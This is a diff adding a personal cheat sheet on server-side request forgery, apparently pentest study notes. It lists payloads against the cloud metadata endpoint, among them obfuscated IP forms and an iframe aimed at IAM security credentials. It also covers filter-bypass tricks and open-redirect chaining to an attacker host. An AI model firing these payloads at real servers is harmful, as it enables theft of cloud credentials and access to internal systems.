@@ -1,0 +1,107 @@
+http://[::ⓕⓕⓕⓕ:①⑥⑨。②⑤④。⑯⑨。②⑤④]:80/latest/metada
+http://169.254.169.254/latest/meta-data
+http://OxA9FEA9FE/latest/meta-data
+http://0251.0376.0251.0376/
+<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>  
+
+----------------------------------------------------------------------+
+----------------------------------------------------------------------+
+Server Side Request Forgery (SSRF)
+----------------------------------------------------------------------+
+----------------------------------------------------------------------+
+
+~ SSRF allows an attacker to trick the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing
+~ trypically the attacker might cause the server to make a connection back to itself allowing access to restricted files
+~ it can also cause Command Injection
+
+Finding SSRF  ---------------------------+
+~ look for any API's making connections
+~ inject absolute URLs into images that can be posted
+~ Look for parameter that are making a request to any backend systems or any other absolute URL within the application
+~ look for parameters using partial URLs
+~ look for referer headers to perform Blind SSRF
+~ Send Arbituary locations through the parameters to see the response
+if the response is positive try to access restricted files on the server by acting as if the request came from the local server eg 
+
+stockApi-=https://victim-site.com ----> stockAPpi=https://localhost/admin
+this gives th access to the admin page which you would normally not be able to view
+
+
+You can also try to brute force and gain access to internal pages or files
+stockApi-=https://victim-site.com ----> stockAPpi=https://192.168.0.45/admin
+
+
+
+bypassing common SSRF defenses  ---------------------------------+
+
+~ Some applications block input containing hostnames like 127.0.0.1 and localhost, or sensitive URLs like /admin.
+instead use 
+1) 127.0.0.1 --> 2130706433, 017700000001, or 127.1
+2) Registering your own domain name that resolves to 127.0.0.1. You can use spoofed.burpcollaborator.net for this purpose.
+3) double url encode one of the character eg for admin a=%2561 --> /%2561dmin
+
+Whitelisted URLS ------------+
+if the server is using a whitelist check the URl the you can use :
+1)  embed credentials in a URL before the hostname ,
+eg https://victim-host@evil-host or 
+https://evil-host@victim-host or 
+http://username@victim-host/ --> http://localhost:80%2523@victim-host.net/admin/delete , /admin/delete is continuation of localhost and %2523 = # which is double encoded and represents fragment url
+2) use the # character to indicate a URL fragment. eg https://victim-host#expected-host
+3)URL-encode or double url encode characters
+4) use combinations of these techniques together. 
+
+
+Open Redirection ------------+ 
+~ if there is and open redirection Vulnerability also in the SSRF attack surface then it can be used to bypass the defense filters eg 
+StockAPI=https://victim-site.com/normal-url?redirect_url=https://evil-site.com
+this works because the application first validates that the supplied stockAPI URL is on an allowed domain, which it is , application then requests the supplied URL, which triggers the open redirection
+~ when redirecting ensure you put a valid path that passes through the header eg
+GET /product/productId=1 ---> then if you redirecting StockAPI param --> StockAPI=/product/nextProduct?path=http://192.168.0.12:8080/admin
+
+
+----------------------------------------------------------------------+
+----------------------------------------------------------------------+
+Blind Server Side Request Forgery (SSRF)
+----------------------------------------------------------------------+
+----------------------------------------------------------------------+
+
+~ This is when an application can be tricked to issue a back-end HTTP request to a supplied URL, but the response from the back-end request is not returned in the application's front-end response.
+
+
+Blind SSRF with out-of-band detection  ---------------------------+
+
+~ This involves attempting to trigger an HTTP request to an external system that you control, and monitoring for network interactions with that system
+~ Use burp collaborator as the payload location,  If an incoming HTTP request is observed coming from the application, then it is vulnerable to SSRF.
+~ Sometimes a DNS request will be made but no subsequent HTTP request, that is because since the infrastructure needs to be able to query all external domain but is prevented from visiting unknown domains
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
